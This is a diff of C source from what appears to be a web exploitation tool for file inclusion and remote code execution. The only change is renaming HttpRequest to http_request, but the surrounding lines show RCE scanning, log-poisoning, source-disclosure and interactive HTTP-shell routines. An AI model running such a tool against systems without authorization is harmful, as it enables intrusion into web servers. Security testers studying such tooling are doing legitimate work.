@@ -67,7 +67,7 @@ bool check_auth_poison(const char *target){
 
     build_rce_exploit(curl, NULL, NULL, phpcode, AUTH);
 
-    if(HttpRequest(curl)){
+    if(http_request(curl)){
         fclose(fh);
 
         fd = readonly(rfile);
@@ -169,7 +169,7 @@ int is_dynamic(const char *url){
     init_str(&body2);
 
 
-    if(!HttpRequest(ch1) || !HttpRequest(ch2)){
+    if(!http_request(ch1) || !http_request(ch2)){
         result = -1;
         goto end;
     }
@@ -245,7 +245,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         build_rce_exploit(curl, NULL, NULL, php_code, INPUT);
         info_single("requesting: %s\n", rce_uri);
 
-        if(!HttpRequest(curl)){
+        if(!http_request(curl)){
             error_single("request error\n");
         } else {
             if(regex_match(regex, body.ptr, 0, 0)){
@@ -283,7 +283,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
         build_rce_exploit(curl, NULL, NULL, php_code, ENVIRON);
 
-        if(!HttpRequest(curl)){
+        if(!http_request(curl)){
             error_single("request error\n");
         } else {
             if( regex_match(regex, body.ptr, 0, 0) ){
@@ -318,7 +318,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
     char *datawrap = build_url(base, plist, p, b64datawrap, replace_string);
     curl_easy_setopt(curl, CURLOPT_URL, datawrap);
 
-    if(!HttpRequest(curl)){
+    if(!http_request(curl)){
         error_single("request error\n");
         //print_single("[-] Request error\n");
         //print_single("[-] probably not vulnerable\n");
@@ -362,7 +362,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)auth_scan_file);
 
         info_single("requesting: %s\n", rce_uri);
-        if(!HttpRequest(curl)){
+        if(!http_request(curl)){
             error_single("request error\n");
         } else {
             fflush(auth_scan_file);
@@ -427,7 +427,7 @@ void source_disclosure_get(const char *url, const char *filename, const char *pn
 
     info_single("trying get source code of file: %s\n", filename);
 
-    if(!HttpRequest(ch1) || !HttpRequest(ch2))
+    if(!http_request(ch1) || !http_request(ch2))
         goto end;
 
     content_diff = diff(body1.ptr, body2.ptr);
@@ -500,7 +500,7 @@ int check_files(char *base, struct parameter_list *plist, int p){
 
         info_single("requesting: %s\n", file_uri);
 
-        if(!HttpRequest(ch)){
+        if(!http_request(ch)){
             error_single("no connection with the target URL, exiting ...\n");
         } else {
             if(regex_match(regex, body.ptr, body.len, 0)){
@@ -544,7 +544,7 @@ void exec_phpcode(const char *url, const char *parameter, const char *code, int 
 
     build_regex(regex, rbuf, "(.*)");
 
-    if(HttpRequest(curl)){
+    if(http_request(curl)){
         match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
     }
 
@@ -626,7 +626,7 @@ void rce_http_shell(const char *url, const char *parameter, int technique){
 
         build_rce_exploit(curl, url, parameter, phpcode, technique);
 
-        if(HttpRequest(curl)){
+        if(http_request(curl)){
             if(technique == AUTH){
                 fclose(fh);
                 fd = readonly(random_file);
@@ -672,7 +672,7 @@ int common_error_check(const char *uri){
 
     curl_easy_setopt(ch, CURLOPT_URL, uri);
 
-    if(!HttpRequest(ch)){
+    if(!http_request(ch)){
         result = -1;
     } else {
         if(check_error(body.ptr))
@@ -699,7 +699,7 @@ int disclosure_check(const char *uri, const char *xuri){
     curl_easy_setopt(ch1, CURLOPT_URL, uri);
     curl_easy_setopt(ch2, CURLOPT_URL, xuri);
 
-    if(!HttpRequest(ch1) || !HttpRequest(ch2)){
+    if(!http_request(ch1) || !http_request(ch2)){
         result = -1;
         goto end;
     }
